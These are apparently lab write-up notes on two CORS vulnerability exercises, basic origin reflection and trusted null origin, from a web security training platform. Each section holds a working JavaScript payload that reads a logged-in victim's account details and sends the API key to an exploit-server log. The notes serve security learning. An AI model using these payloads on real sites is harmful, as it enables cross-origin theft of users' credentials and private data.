# CORS

## CORS vulnerability with basic origin reflection
After logging in, the application includes an API key in the response to /accountdetails page. 

Notice that after logging in the response includes the header `Access-Control-Allow-Credentials: true` indicating the web server supports CORS

Modifying the request with the header `Origin: example.com` the request includes the header `Access-Control-Allow-Origin: example.com`

Stage this in the exploit server 
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
The XMLHttpRequest from the malicious domain is possible because CORS is enabled. Set withCredentials=true to include the API Key in the response.
The reqListener takes the response and appends it to the log.
Then we check the log to find the administrator's API key

## CORS vulnerability with trusted null origin
This cors vulnerability also has the Access-Control-Allow-Origin header, suggesting CORS, as well as `X-Frame-Options: SAMEORIGIN`
We have to stage an exploit in such a way that the origin header is set to null, which we can do by using iframe with the sandbox attribute.
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get', 'https://0a290065046be0768013713000fc00f2.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-0a9300380459e01b8043702f019e00ff.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

This is a vulnerability because the server trusts any null origin, so the sandboxed environment can read private user data in the cookies or response